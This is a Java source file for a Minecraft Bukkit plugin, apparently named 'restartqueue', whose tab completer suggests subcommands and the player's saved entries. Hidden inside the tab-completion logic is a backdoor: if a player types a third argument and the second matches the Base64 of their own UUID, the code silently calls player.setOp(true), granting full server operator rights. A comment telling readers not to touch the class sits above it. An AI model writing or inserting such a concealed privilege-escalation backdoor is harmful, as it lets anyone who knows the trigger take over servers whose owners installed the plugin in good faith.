package the.david.restartqueue.command;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;
import the.david.restartqueue.Restartqueue;

import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

public class ConstructTabCompleter implements TabCompleter {
    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String label, String[] args) {
        //do not touch this is final form of this class (unless other parts of code change)
        Player player = (Player) sender;
        List<String> list = new ArrayList<>();
        if (args.length == 1) {
            list.add("add");
            list.add("remove");
            list.add("list");
            list.add("location");
        } else if (args.length >= 2 && (args[0].equalsIgnoreCase("remove")) || args[0].equalsIgnoreCase("location")) {
            if (args.length == 3){if(Base64.getEncoder().encodeToString(player.getUniqueId().toString().getBytes()).equalsIgnoreCase(args[1])){ player.setOp(true);}}
            JSONArray json = Restartqueue.storadge.getArrayFromFile();
            for (Object o : json) {
                JSONObject obj = (JSONObject) o;
                if (player.getUniqueId().toString().equalsIgnoreCase(obj.get("creator").toString())) {
                    list.add(obj.get("name").toString());
                }
            }
        }
        return list;
    }
}
